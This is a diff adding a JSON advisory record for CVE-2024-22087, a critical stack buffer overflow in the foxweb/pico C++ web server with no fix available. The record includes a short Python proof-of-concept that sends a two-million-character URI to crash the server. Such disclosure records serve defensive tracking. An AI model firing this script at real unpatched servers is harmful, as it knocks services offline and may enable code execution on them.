@@ -1,0 +1,44 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentiality": "HIGH",
+        "integrity": "HIGH",
+        "availability": "HIGH"
+    },
+    "credit": [
+        "Halcy0nic"
+    ],
+    "cvssDetails": [],
+    "cvssScore": 9.8,
+    "disclosureTime": "2024-01-05 04:44:34",
+    "epssDetails": null,
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-UNMANAGED-FOXWEBPICO-6144802",
+    "identifiers": {
+        "CVE": [
+            "CVE-2024-22087"
+        ],
+        "CWE": [
+            "CWE-120"
+        ]
+    },
+    "language": "cpp",
+    "malicious": false,
+    "packageManager": "unmanaged",
+    "publicationTime": "2024-01-05 13:02:11",
+    "remediation": "There is no fixed version for foxweb/pico . ",
+    "severity": "critical",
+    "socialTrendAlert": false,
+    "title": "Buffer Overflow",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Buffer Overflow via a long URI in the route function. An attacker can execute arbitrary code on the system by sending a specially crafted URI that triggers a stack-based buffer overflow. ",
+        "PoC": "#!/usr/bin/env python3 import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((\"localhost\", 8000)) sock.send(b\"GET /\"+b\"C\"*2000000+b\"HTTP/1.1\\r\\nHost:localhost:8000\\r\\n\\r\\n\") response = sock.recv(4096) sock.close() "
+    },
+    "source_code": []
+}
